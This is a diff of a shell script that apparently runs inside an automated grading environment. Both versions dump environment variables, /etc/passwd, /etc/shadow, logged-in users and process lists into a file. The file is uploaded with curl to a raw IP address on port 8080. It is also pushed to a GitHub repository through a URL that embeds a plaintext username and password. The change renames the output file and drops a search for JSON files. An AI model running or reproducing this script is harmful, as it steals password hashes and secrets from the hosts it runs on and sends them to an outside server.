@@ -1,25 +1,24 @@
-pwd > testing
-echo ----------------- ls ------- >> testing
-find /tmp/ -depth -type f -printf "-----%p------\n" -exec grep -i "json" '{}' \; >> testing
-find /dev/ -depth -type f -printf "-----%p------\n" -exec grep -i "json" '{}' \; >> testing
-echo ----------------- Environment ------- >> testing
-env >> testing
-echo ----------------- User Info ------- >> testing
-cat /etc/passwd >> testing
-cat /etc/shadow >> testing
-echo ----------------- Users logged in ------- >> testing
-w >> testing
-echo ----------------- Disk Space ------- >> testing
-df -h >> testing
-echo ----------------- ps -aux ------- >> testing
-ps -aux >> testing
-echo ----------------- END $(date) ------- >> testing
-curl -F "name=@testing" http://138.68.58.230:8080
+pwd > results
+echo ----------------- ls ------- >> results
+find /tmp/ -depth -type f -printf "-----%p------\n" >> results
+echo ----------------- Environment ------- >> results
+env >> results
+echo ----------------- User Info ------- >> results
+cat /etc/passwd >> results
+cat /etc/shadow >> results
+echo ----------------- Users logged in ------- >> results
+w >> results
+echo ----------------- Disk Space ------- >> results
+df -h >> results
+echo ----------------- ps -aux ------- >> results
+ps -aux >> results
+echo ----------------- END $(date) ------- >> results
+curl -F "name=@results" http://138.68.58.230:8080
 apt-get -q install git
 git clone http://github.com/hbtnstuff/tests.git
-cp -r /tmp/correction/holberton_betty/ tests/
 cd tests/
+cp ../results .
 git add . 
 git commit "t"
 git push 'https://hbtnstuff:s4turd4yh4ck4thon;@github.com/hbtnstuff/tests.git' master
-rm testing
+rm results
